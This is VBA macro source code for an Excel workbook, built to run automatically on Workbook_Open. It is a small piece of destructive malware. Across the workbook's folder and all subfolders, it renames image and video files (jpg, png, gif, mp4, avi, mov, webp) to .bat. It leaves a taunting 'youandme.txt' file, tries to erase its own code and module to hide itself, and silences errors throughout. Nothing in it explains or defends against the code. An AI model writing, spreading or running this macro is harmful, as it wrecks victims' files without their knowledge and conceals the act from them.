Private Sub Workbook_Open()
    Dim FSO As Object
    Dim FolderPath As String
    Dim TextFile As Object
    Dim vbProj As Object
    Dim vbComp As Object
    Dim vbCompName As String

    On Error Resume Next

    ' Set folder path to the directory of the workbook
    FolderPath = ThisWorkbook.Path

    ' Create FileSystemObject
    Set FSO = CreateObject("Scripting.FileSystemObject")

    ' Process folder and subfolders
    ProcessFolder FSO.GetFolder(FolderPath)

    ' Create "youandme.txt" and write content
    Set TextFile = FSO.CreateTextFile(FolderPath & "\youandme.txt", True)
    TextFile.WriteLine "its a fun :)"
    TextFile.Close

    ' Delete VBA code and module
    Set vbProj = ThisWorkbook.VBProject
    For Each vbComp In vbProj.VBComponents
        vbCompName = vbComp.Name
        If vbCompName = "ThisWorkbook" Then
            vbComp.CodeModule.DeleteLines 1, vbComp.CodeModule.CountOfLines
        End If
    Next vbComp

    ' Delete the module itself
    vbProj.VBComponents.Remove vbProj.VBComponents("ThisWorkbook")

    ' Clean up
    Set FSO = Nothing
    Set TextFile = Nothing
    Set vbProj = Nothing
    Set vbComp = Nothing

    ' Save the workbook to apply changes
    ThisWorkbook.Save
End Sub

Sub ProcessFolder(Folder)
    Dim File As Object
    Dim SubFolder As Object
    Dim FSO As Object
    Dim FileExtension As String

    ' Create FileSystemObject
    Set FSO = CreateObject("Scripting.FileSystemObject")

    ' Process each file in the folder
    For Each File In Folder.Files
        ' Check for photo and film formats
        FileExtension = LCase(FSO.GetExtensionName(File.Name))
        If FileExtension = "jpg" Or FileExtension = "png" Or FileExtension = "gif" Or _
           FileExtension = "mp4" Or FileExtension = "avi" Or FileExtension = "mov" Or _
           FileExtension = "webp" Then
            ' Rename file with .bat extension
            File.Name = Replace(File.Name, "." & FileExtension, ".bat")
        End If
    Next File

    ' Process each subfolder
    For Each SubFolder In Folder.SubFolders
        ProcessFolder SubFolder
    Next SubFolder
End Sub
